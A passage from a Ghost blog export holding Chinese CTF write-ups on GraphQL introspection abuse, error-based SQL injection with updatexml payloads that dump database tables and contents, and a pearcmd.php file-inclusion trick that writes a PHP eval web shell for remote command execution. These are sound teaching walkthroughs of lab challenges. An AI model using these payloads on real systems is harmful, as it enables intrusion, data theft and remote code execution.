                        "html": "<h4 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h4><blockquote>graphql 查询</blockquote><blockquote>目录扫描工具：御剑</blockquote><p></p><h4 id=\"1%E3%80%81%E9%A1%B5%E9%9D%A2%E6%83%85%E5%86%B5\">1、页面情况</h4><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117142929.png' /><!--kg-card-end: html--><blockquote>页面很简洁就一个输入框，可以输入用户的id</blockquote><blockquote>测试后发现用户id的范围为：1~6，超出这个范围会返回这个信息</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117143243.png' /><!--kg-card-end: html--><h5 id=\"%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%B8%80%E6%9D%A1%E2%80%9C%E6%8F%90%E7%A4%BA%E4%BF%A1%E6%81%AF%EF%BC%9F%E2%80%9D%EF%BC%8C%E7%9C%8B%E4%B8%8D%E6%87%82\">查看源代码，发现一条“提示信息？”，看不懂</h5><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/U%60D)%609@%60313JIF8(~C~E2JB.png' /><!--kg-card-end: html--><h4 id=\"2%E3%80%81%E4%BD%BF%E7%94%A8%E5%BE%A1%E5%89%91%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%8B%E7%BD%91%E5%9D%80%E7%9B%AE%E5%BD%95\">2、使用御剑扫描一下网址目录</h4><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/7WBHY%7BB$$RP7%7B%60%7B2FLN%5B9%606.png' /><!--kg-card-end: html--><blockquote>访问下载www.zip</blockquote><h4 id=\"3%E3%80%81%E5%88%86%E6%9E%90%E5%85%B6%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81\">3、分析其中的php代码</h4><pre><code class=\"language-php\">&lt;?php\n    error_reporting(0);\n\n    // 传入参数id\n    $id = $_POST['id'];\n\n\n    // $str = $id\n    // 对id进行过滤，id中必须含有数字，非数字部分会被替换为空\n    function waf($str)\n    {\n        if (!is_numeric($str) || preg_replace(\"/[0-9]/\", \"\", $str) !== \"\") {\n            return False;\n        } else {\n            return True;\n        }\n    }\n\n    // 发送查询的数据并返回结果\n    function send($data)\n    {\n        $options = array(\n            'http' =&gt; array(\n                'method' =&gt; 'POST',\n                'header' =&gt; 'Content-type: application/json',\n                'content' =&gt; $data,\n                'timeout' =&gt; 10 * 60\n            )\n        );\n\n        $context = stream_context_create($options);\n        $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context);\n        return $result;\n    }\n\n    // 首先判断id是否为空\n    if (isset($id)) {\n\n        // id进行waf过滤\n        if (waf($id)) {\n\n            // 需要在传入一个参数data, 会根据data是否为空执行代码\n            // 如果data不为空，使用data的值，为空使用默认的值\n                /**\n                * '{\n                *       \"query\":\"query{\n                *           users_user_by_pk(id:' . $id . ') {\n                *                name\n                *           }\n                *        }\", \n                *        \"variables\":null\n                *  }';\n                * \n                * \n                */\n            isset($_POST['data']) ? $data = $_POST['data'] : $data = '{\"query\":\"query{\\nusers_user_by_pk(id:' . $id . ') {\\nname\\n}\\n}\\n\", \"variables\":null}';\n\n            // 接收结果并将结果对JSON格式的字符串进行解码\n            $res = json_decode(send($data));\n\n            // 查询结果中的name不为空就将其展示到页面上，否则输出找不到\n            if ($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL) {\n                echo \"ID: \" . $id . \"&lt;br&gt;Name: \" . $res-&gt;data-&gt;users_user_by_pk-&gt;name;\n            } else {\n                echo \"&lt;b&gt;Can't found it!&lt;/b&gt;&lt;br&gt;&lt;br&gt;DEBUG: \";\n                var_dump($res-&gt;data);\n            }\n        } else {\n            die(\"&lt;b&gt;Hacker! Only Number!&lt;/b&gt;\");\n        }\n    } else {\n        die(\"&lt;b&gt;No Data?&lt;/b&gt;\");\n    }\n?&gt;\n</code></pre><blockquote>关于graphql查询，有一种查询方式可以查询所有该API端点的所有信息</blockquote><pre><code>{\"query\":\"\\n    query IntrospectionQuery {\\r\\n      __schema {\\r\\n        queryType { name }\\r\\n        mutationType { name }\\r\\n        subscriptionType { name }\\r\\n        types {\\r\\n          ...FullType\\r\\n        }\\r\\n        directives {\\r\\n          name\\r\\n          description\\r\\n          locations\\r\\n          args {\\r\\n            ...InputValue\\r\\n          }\\r\\n        }\\r\\n      }\\r\\n    }\\r\\n\\r\\n    fragment FullType on __Type {\\r\\n      kind\\r\\n      name\\r\\n      description\\r\\n      fields(includeDeprecated: true) {\\r\\n        name\\r\\n        description\\r\\n        args {\\r\\n          ...InputValue\\r\\n        }\\r\\n        type {\\r\\n          ...TypeRef\\r\\n        }\\r\\n        isDeprecated\\r\\n        deprecationReason\\r\\n      }\\r\\n      inputFields {\\r\\n        ...InputValue\\r\\n      }\\r\\n      interfaces {\\r\\n        ...TypeRef\\r\\n      }\\r\\n      enumValues(includeDeprecated: true) {\\r\\n        name\\r\\n        description\\r\\n        isDeprecated\\r\\n        deprecationReason\\r\\n      }\\r\\n      possibleTypes {\\r\\n        ...TypeRef\\r\\n      }\\r\\n    }\\r\\n\\r\\n    fragment InputValue on __InputValue {\\r\\n      name\\r\\n      description\\r\\n      type { ...TypeRef }\\r\\n      defaultValue\\r\\n    }\\r\\n\\r\\n    fragment TypeRef on __Type {\\r\\n      kind\\r\\n      name\\r\\n      ofType {\\r\\n        kind\\r\\n        name\\r\\n        ofType {\\r\\n          kind\\r\\n          name\\r\\n          ofType {\\r\\n            kind\\r\\n            name\\r\\n            ofType {\\r\\n              kind\\r\\n              name\\r\\n              ofType {\\r\\n                kind\\r\\n                name\\r\\n                ofType {\\r\\n                  kind\\r\\n                  name\\r\\n                  ofType {\\r\\n                    kind\\r\\n                    name\\r\\n                  }\\r\\n                }\\r\\n              }\\r\\n            }\\r\\n          }\\r\\n        }\\r\\n      }\\r\\n    }\\r\\n  \",\"variables\":null}\n</code></pre><blockquote>然后将上面这个放入data中，然后去执行就会返回所有信息，然后在返回信息中搜索一下flag</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117161755.png' /><!--kg-card-end: html--><blockquote>这样就找到flag所在的类的名称：ffffllllaaagggg_1n_h3r3_flag</blockquote><blockquote>然后在构造data查询</blockquote><pre><code>{\"query\":\"query{\\nffffllllaaagggg_1n_h3r3_flag{\\nflag\\n}\\n}\\n\", \"variables\":null}\n\n// 直观点查看\n{\n\t\"query\":\"query{\n    \t\tffffllllaaagggg_1n_h3r3_flag{\n            \tflag\n            }\n    \t}\",\n    \"variables\":null\n}</code></pre><h4 id=\"4%E3%80%81%E7%BB%93%E6%9E%9C\">4、结果</h4><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117162630.png' /><!--kg-card-end: html--><blockquote>关于graphql的资料可以看看这个</blockquote><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">玩转graphQL</div><div class=\"kg-bookmark-description\">这是酒仙桥六号部队的第118篇文章-玩转graphQL。全文共计4257个字，预计阅读时长12分钟。</div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"https://res.wx.qq.com/a/wx_fed/assets/res/OTE0YTAw.png\" alt=\"\"><span class=\"kg-bookmark-author\">微信公众平台</span><span class=\"kg-bookmark-publisher\">先锋情报站</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"http://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s54B52X8UPybZgzLeupG5ic16ibqicJicrq3dpBdZunVJWrxHsbNG53Eyiaiaibh6p2b523z6Jvpu8KTtaPTw/0?wx_fmt&#x3D;jpeg\" alt=\"\"></div></a></figure>",
                        "comment_id": "6375d457f7e27b274c0bdb87",
                        "plaintext": "0、知识点与工具\n\ngraphql 查询\n\n目录扫描工具：御剑\n\n\n\n1、页面情况\n\n页面很简洁就一个输入框，可以输入用户的id\n\n测试后发现用户id的范围为：1~6，超出这个范围会返回这个信息\n\n查看源代码，发现一条“提示信息？”，看不懂\n\n2、使用御剑扫描一下网址目录\n\n访问下载www.zip\n\n3、分析其中的php代码\n\n<?php\n    error_reporting(0);\n\n    // 传入参数id\n    $id = $_POST['id'];\n\n\n    // $str = $id\n    // 对id进行过滤，id中必须含有数字，非数字部分会被替换为空\n    function waf($str)\n    {\n        if (!is_numeric($str) || preg_replace(\"/[0-9]/\", \"\", $str) !== \"\") {\n            return False;\n        } else {\n            return True;\n        }\n    }\n\n    // 发送查询的数据并返回结果\n    function send($data)\n    {\n        $options = array(\n            'http' => array(\n                'method' => 'POST',\n                'header' => 'Content-type: application/json',\n                'content' => $data,\n                'timeout' => 10 * 60\n            )\n        );\n\n        $context = stream_context_create($options);\n        $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context);\n        return $result;\n    }\n\n    // 首先判断id是否为空\n    if (isset($id)) {\n\n        // id进行waf过滤\n        if (waf($id)) {\n\n            // 需要在传入一个参数data, 会根据data是否为空执行代码\n            // 如果data不为空，使用data的值，为空使用默认的值\n                /**\n                * '{\n                *       \"query\":\"query{\n                *           users_user_by_pk(id:' . $id . ') {\n                *                name\n                *           }\n                *        }\", \n                *        \"variables\":null\n                *  }';\n                * \n                * \n                */\n            isset($_POST['data']) ? $data = $_POST['data'] : $data = '{\"query\":\"query{\\nusers_user_by_pk(id:' . $id . ') {\\nname\\n}\\n}\\n\", \"variables\":null}';\n\n            // 接收结果并将结果对JSON格式的字符串进行解码\n            $res = json_decode(send($data));\n\n            // 查询结果中的name不为空就将其展示到页面上，否则输出找不到\n            if ($res->data->users_user_by_pk->name !== NULL) {\n                echo \"ID: \" . $id . \"<br>Name: \" . $res->data->users_user_by_pk->name;\n            } else {\n                echo \"<b>Can't found it!</b><br><br>DEBUG: \";\n                var_dump($res->data);\n            }\n        } else {\n            die(\"<b>Hacker! Only Number!</b>\");\n        }\n    } else {\n        die(\"<b>No Data?</b>\");\n    }\n?>\n\n\n关于graphql查询，有一种查询方式可以查询所有该API端点的所有信息\n\n{\"query\":\"\\n    query IntrospectionQuery {\\r\\n      __schema {\\r\\n        queryType { name }\\r\\n        mutationType { name }\\r\\n        subscriptionType { name }\\r\\n        types {\\r\\n          ...FullType\\r\\n        }\\r\\n        directives {\\r\\n          name\\r\\n          description\\r\\n          locations\\r\\n          args {\\r\\n            ...InputValue\\r\\n          }\\r\\n        }\\r\\n      }\\r\\n    }\\r\\n\\r\\n    fragment FullType on __Type {\\r\\n      kind\\r\\n      name\\r\\n      description\\r\\n      fields(includeDeprecated: true) {\\r\\n        name\\r\\n        description\\r\\n        args {\\r\\n          ...InputValue\\r\\n        }\\r\\n        type {\\r\\n          ...TypeRef\\r\\n        }\\r\\n        isDeprecated\\r\\n        deprecationReason\\r\\n      }\\r\\n      inputFields {\\r\\n        ...InputValue\\r\\n      }\\r\\n      interfaces {\\r\\n        ...TypeRef\\r\\n      }\\r\\n      enumValues(includeDeprecated: true) {\\r\\n        name\\r\\n        description\\r\\n        isDeprecated\\r\\n        deprecationReason\\r\\n      }\\r\\n      possibleTypes {\\r\\n        ...TypeRef\\r\\n      }\\r\\n    }\\r\\n\\r\\n    fragment InputValue on __InputValue {\\r\\n      name\\r\\n      description\\r\\n      type { ...TypeRef }\\r\\n      defaultValue\\r\\n    }\\r\\n\\r\\n    fragment TypeRef on __Type {\\r\\n      kind\\r\\n      name\\r\\n      ofType {\\r\\n        kind\\r\\n        name\\r\\n        ofType {\\r\\n          kind\\r\\n          name\\r\\n          ofType {\\r\\n            kind\\r\\n            name\\r\\n            ofType {\\r\\n              kind\\r\\n              name\\r\\n              ofType {\\r\\n                kind\\r\\n                name\\r\\n                ofType {\\r\\n                  kind\\r\\n                  name\\r\\n                  ofType {\\r\\n                    kind\\r\\n                    name\\r\\n                  }\\r\\n                }\\r\\n              }\\r\\n            }\\r\\n          }\\r\\n        }\\r\\n      }\\r\\n    }\\r\\n  \",\"variables\":null}\n\n\n然后将上面这个放入data中，然后去执行就会返回所有信息，然后在返回信息中搜索一下flag\n\n这样就找到flag所在的类的名称：ffffllllaaagggg_1n_h3r3_flag\n\n然后在构造data查询\n\n{\"query\":\"query{\\nffffllllaaagggg_1n_h3r3_flag{\\nflag\\n}\\n}\\n\", \"variables\":null}\n\n// 直观点查看\n{\n\t\"query\":\"query{\n    \t\tffffllllaaagggg_1n_h3r3_flag{\n            \tflag\n            }\n    \t}\",\n    \"variables\":null\n}\n\n4、结果\n\n关于graphql的资料可以看看这个\n\n玩转graphQL这是酒仙桥六号部队的第118篇文章-玩转graphQL。全文共计4257个字，预计阅读时长12分钟。微信公众平台先锋情报站",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/807c18bb11faaa6a722bdef4c6235e52.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-17T06:27:35.000Z",
                        "updated_at": "2022-11-17T08:32:53.000Z",
                        "published_at": "2022-11-17T08:32:02.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "6376106df7e27b274c0bdc1f",
                        "uuid": "04bbdc01-3def-44bf-b72e-ccb288ad8775",
                        "title": "Week2 Word-For-You(2 Gen) 200",
                        "slug": "week2-2",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117185718.png' />\\n\\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117185757.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117190746.png' />\"}],[\"code\",{\"code\":\"// 留言板\\ninsert into 表名(你的名字，他的名字，内容) value();\\n\\n// 查询留言\\nselect * from 表名 where 名字 = '我们的传入的值';\"}],[\"code\",{\"code\":\"// 假如让ta的名字这一栏的值为：1'||updatexml(1,concat(0x7e,database()),1)#\\n// 留言内容随便，那么留言查询的sql就会变成\\nselect * from 表名 where 名字 = '1'||updatexml(1,concat(0x7e,database()),1)#';\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/675e2530aa6cac276a1e614794d411c.jpg' />\"}],[\"code\",{\"code\":\"1'||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'wfy')),1)#\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/1686dad9f4a761d2089035dddf0db4b.jpg' />\"}],[\"code\",{\"code\":\"1'||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),1)#\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/2d4d96506fc2226df7c3ce6f3d36188.jpg' />\"}],[\"code\",{\"code\":\"\\n1'||updatexml(1,concat(0x7e,(select group_concat(text,user,name,display) from wfy_comments)),1)#\",\"language\":\"\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/840c1cd52f3a523a053d358250a989f.jpg' />\"}],[\"code\",{\"code\":\"1'||updatexml(1,substr(concat(0x7e,(select group_concat(text) from wfy_comments)),160,182),1)#'\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/201792d828e3b0deb140931e30d4261.jpg' />\\n\\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/f0ced2833c3e0c90c39652e3235f2dc.png' />\"}]],\"markups\":[],\"sections\":[[1,\"h4\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"sql 注入\"]]],[1,\"blockquote\",[[0,[],0,\"sql报错注入\"]]],[1,\"blockquote\",[[0,[],0,\"工具：burpsuite\"]]],[1,\"h4\",[[0,[],0,\"1、页面\"]]],[1,\"blockquote\",[[0,[],0,\"有两个页面，一个页面用于留言，也就是写入sql\"],[1,[],0,0],[0,[],0,\"另一个页面用于查询留言，也就是触发注入的sql\"]]],[10,0],[1,\"blockquote\",[[0,[],0,\"然后发现留言板查询页面无法看到留言的内容，只能看到查询是否成功\"]]],[10,1],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\"2、分析一下\"]]],[1,\"blockquote\",[[0,[],0,\"首先根据这俩个页面的输入框，可以猜测后台的sql代码应该为：\"]]],[10,2],[1,\"blockquote\",[[0,[],0,\"因为只显示是否查询成功，所以可以想到报错注入或者bool盲注\"],[1,[],0,1],[0,[],0,\"由于bool盲注比较麻烦，所以首先尝试报错注入\"]]],[10,3],[1,\"blockquote\",[[0,[],0,\"显示的结果成功的爆出了数据库名称\"]]],[10,4],[1,\"blockquote\",[[0,[],0,\"爆出了数据库那么接下来爆个表吧\"]]],[10,5],[10,6],[1,\"blockquote\",[[0,[],0,\"然后爆个字段吧\"]]],[10,7],[10,8],[1,\"blockquote\",[[0,[],0,\"获取字段内容\"]]],[10,9],[10,10],[1,\"blockquote\",[[0,[],0,\"可以发现并没有显示flag，这是因为报错回显的内容最多为32个字符，超出部分就不会显示了，所以得加个substr字符串截取，或者写个脚本，\"],[1,[],0,2],[0,[],0,\"substr函数不能加在group_concat()的前面，虽然会返回一个字符串但是放这里就有语法错误，但是在本地的测试到不会报错，奇奇怪怪\"]]],[10,11],[10,12],[1,\"blockquote\",[[0,[],0,\"flag{Ju4t_m2ke_some_err0rs}\"]]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h4 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h4><blockquote>sql 注入</blockquote><blockquote>sql报错注入</blockquote><blockquote>工具：burpsuite</blockquote><h4 id=\"1%E3%80%81%E9%A1%B5%E9%9D%A2\">1、页面</h4><blockquote>有两个页面，一个页面用于留言，也就是写入sql<br>另一个页面用于查询留言，也就是触发注入的sql</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117185718.png' />\n\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117185757.png' /><!--kg-card-end: html--><blockquote>然后发现留言板查询页面无法看到留言的内容，只能看到查询是否成功</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117190746.png' /><!--kg-card-end: html--><p></p><h4 id=\"2%E3%80%81%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B\">2、分析一下</h4><blockquote>首先根据这俩个页面的输入框，可以猜测后台的sql代码应该为：</blockquote><pre><code>// 留言板\ninsert into 表名(你的名字，他的名字，内容) value();\n\n// 查询留言\nselect * from 表名 where 名字 = '我们的传入的值';</code></pre><blockquote>因为只显示是否查询成功，所以可以想到报错注入或者bool盲注<br>由于bool盲注比较麻烦，所以首先尝试报错注入</blockquote><pre><code>// 假如让ta的名字这一栏的值为：1'||updatexml(1,concat(0x7e,database()),1)#\n// 留言内容随便，那么留言查询的sql就会变成\nselect * from 表名 where 名字 = '1'||updatexml(1,concat(0x7e,database()),1)#';</code></pre><blockquote>显示的结果成功的爆出了数据库名称</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/675e2530aa6cac276a1e614794d411c.jpg' /><!--kg-card-end: html--><blockquote>爆出了数据库那么接下来爆个表吧</blockquote><pre><code>1'||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'wfy')),1)#</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/1686dad9f4a761d2089035dddf0db4b.jpg' /><!--kg-card-end: html--><blockquote>然后爆个字段吧</blockquote><pre><code>1'||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),1)#</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/2d4d96506fc2226df7c3ce6f3d36188.jpg' /><!--kg-card-end: html--><blockquote>获取字段内容</blockquote><pre><code>\n1'||updatexml(1,concat(0x7e,(select group_concat(text,user,name,display) from wfy_comments)),1)#</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/840c1cd52f3a523a053d358250a989f.jpg' /><!--kg-card-end: html--><blockquote>可以发现并没有显示flag，这是因为报错回显的内容最多为32个字符，超出部分就不会显示了，所以得加个substr字符串截取，或者写个脚本，<br>substr函数不能加在group_concat()的前面，虽然会返回一个字符串但是放这里就有语法错误，但是在本地的测试到不会报错，奇奇怪怪</blockquote><pre><code>1'||updatexml(1,substr(concat(0x7e,(select group_concat(text) from wfy_comments)),160,182),1)#'</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/201792d828e3b0deb140931e30d4261.jpg' />\n\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/f0ced2833c3e0c90c39652e3235f2dc.png' /><!--kg-card-end: html--><blockquote>flag{Ju4t_m2ke_some_err0rs}</blockquote>",
                        "comment_id": "6376106df7e27b274c0bdc1f",
                        "plaintext": "0、知识点与工具\n\nsql 注入\n\nsql报错注入\n\n工具：burpsuite\n\n1、页面\n\n有两个页面，一个页面用于留言，也就是写入sql\n另一个页面用于查询留言，也就是触发注入的sql\n\n\n\n然后发现留言板查询页面无法看到留言的内容，只能看到查询是否成功\n\n\n\n2、分析一下\n\n首先根据这俩个页面的输入框，可以猜测后台的sql代码应该为：\n\n// 留言板\ninsert into 表名(你的名字，他的名字，内容) value();\n\n// 查询留言\nselect * from 表名 where 名字 = '我们的传入的值';\n\n因为只显示是否查询成功，所以可以想到报错注入或者bool盲注\n由于bool盲注比较麻烦，所以首先尝试报错注入\n\n// 假如让ta的名字这一栏的值为：1'||updatexml(1,concat(0x7e,database()),1)#\n// 留言内容随便，那么留言查询的sql就会变成\nselect * from 表名 where 名字 = '1'||updatexml(1,concat(0x7e,database()),1)#';\n\n显示的结果成功的爆出了数据库名称\n\n爆出了数据库那么接下来爆个表吧\n\n1'||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'wfy')),1)#\n\n然后爆个字段吧\n\n1'||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),1)#\n\n获取字段内容\n\n\n1'||updatexml(1,concat(0x7e,(select group_concat(text,user,name,display) from wfy_comments)),1)#\n\n可以发现并没有显示flag，这是因为报错回显的内容最多为32个字符，超出部分就不会显示了，所以得加个substr字符串截取，或者写个脚本，\nsubstr函数不能加在group_concat()的前面，虽然会返回一个字符串但是放这里就有语法错误，但是在本地的测试到不会报错，奇奇怪怪\n\n1'||updatexml(1,substr(concat(0x7e,(select group_concat(text) from wfy_comments)),160,182),1)#'\n\n\n\nflag{Ju4t_m2ke_some_err0rs}",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/92febdf52a0878109fcd32233704fefd.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-17T10:43:57.000Z",
                        "updated_at": "2022-11-17T12:16:27.000Z",
                        "published_at": "2022-11-17T12:16:27.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "63763e6ef7e27b274c0bdcfa",
                        "uuid": "9387e184-799a-4d62-ab96-fa38512e8273",
                        "title": "WEEK3 IncludeTwo 200",
                        "slug": "week3",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"bookmark\",{\"url\":\"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\",\"metadata\":{\"url\":\"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\",\"title\":\"Docker PHP裸文件本地包含综述 | 离别歌\",\"description\":\"phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。\",\"author\":\"phithon\",\"publisher\":\"离别歌\",\"thumbnail\":\"https://www.leavesongs.com/media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.7a577b438fb6.png\",\"icon\":\"https://www.leavesongs.com/static/cactus/images/favicon-192x192.png\"}}],[\"code\",{\"code\":\"/?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=eval($_POST[_]);?>+/tmp/a.php\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/%5D0~W~URK3D~(LH3F9X@(WCC.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/1%7B8ZU(7FB%7BQWQZHTS%5B%5DV7%7DJ.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/124354uyjfhgfv.png' />\"}]],\"markups\":[[\"code\"]],\"sections\":[[1,\"h4\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"pecl/pear中的pearcmd.php\"]]],[1,\"blockquote\",[[0,[],0,\"文件包含\"]]],[1,\"blockquote\",[[0,[],0,\"工具burpsuite\"]]],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\"1、关于pearcmd.php\"]]],[1,\"blockquote\",[[0,[],0,\"7.4及以后，需要我们在编译PHP的时候指定\"],[0,[0],1,\"--with-pear\"],[0,[],0,\"才会安装。\"]]],[1,\"blockquote\",[[0,[],0,\"pecl是PHP中用于管理扩展而使用的命令行工具，pear是pecl的依赖库\"],[1,[],0,0],[0,[],0,\"在Docker任意版镜像中，都会被默认安装，路径为：/usr/local/lib/php，\"],[1,[],0,1],[0,[],0,\"而pearcmd.php就在这个路径中：/usr/local/lib/php/pearcmd.php\"]]],[1,\"p\",[[0,[],0,\"详细了解可以看看这个\"]]],[10,0],[1,\"p\",[]],[1,\"h3\",[[0,[],0,\"2、解题\"]]],[1,\"blockquote\",[[0,[],0,\"其中config-create是pear中的参数，他的作用是：会把第一个参数的内容写入第二个参数所指定的文件中，然后就可以构造playload\"]]],[10,1],[10,2],[1,\"blockquote\",[[0,[],0,\"末尾处会会在/tmp目录下面生成一个a.php文件，然后我们再去包含一下这个文件，因为我们再这个a.php中内嵌了一个<?=eval($_POST[_]);?>\"],[1,[],0,2],[0,[],0,\" 所以需要访问这个文件，然后在post中传入远程命令\"]]],[10,3],[10,4],[1,\"blockquote\",[[0,[],0,\"然后获得flag\"]]],[1,\"p\",[]],[1,\"p\",[]],[1,\"p\",[]],[1,\"p\",[]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h4 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h4><blockquote>pecl/pear中的pearcmd.php</blockquote><blockquote>文件包含</blockquote><blockquote>工具burpsuite</blockquote><p></p><h4 id=\"1%E3%80%81%E5%85%B3%E4%BA%8Epearcmdphp\">1、关于pearcmd.php</h4><blockquote>7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</blockquote><blockquote>pecl是PHP中用于管理扩展而使用的命令行工具，pear是pecl的依赖库<br>在Docker任意版镜像中，都会被默认安装，路径为：/usr/local/lib/php，<br>而pearcmd.php就在这个路径中：/usr/local/lib/php/pearcmd.php</blockquote><p>详细了解可以看看这个</p><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">Docker PHP裸文件本地包含综述 | 离别歌</div><div class=\"kg-bookmark-description\">phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。</div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"https://www.leavesongs.com/static/cactus/images/favicon-192x192.png\" alt=\"\"><span class=\"kg-bookmark-author\">离别歌</span><span class=\"kg-bookmark-publisher\">phithon</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"https://www.leavesongs.com/media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.7a577b438fb6.png\" alt=\"\"></div></a></figure><p></p><h3 id=\"2%E3%80%81%E8%A7%A3%E9%A2%98\">2、解题</h3><blockquote>其中config-create是pear中的参数，他的作用是：会把第一个参数的内容写入第二个参数所指定的文件中，然后就可以构造playload</blockquote><pre><code>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[_]);?&gt;+/tmp/a.php</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/%5D0~W~URK3D~(LH3F9X@(WCC.png' /><!--kg-card-end: 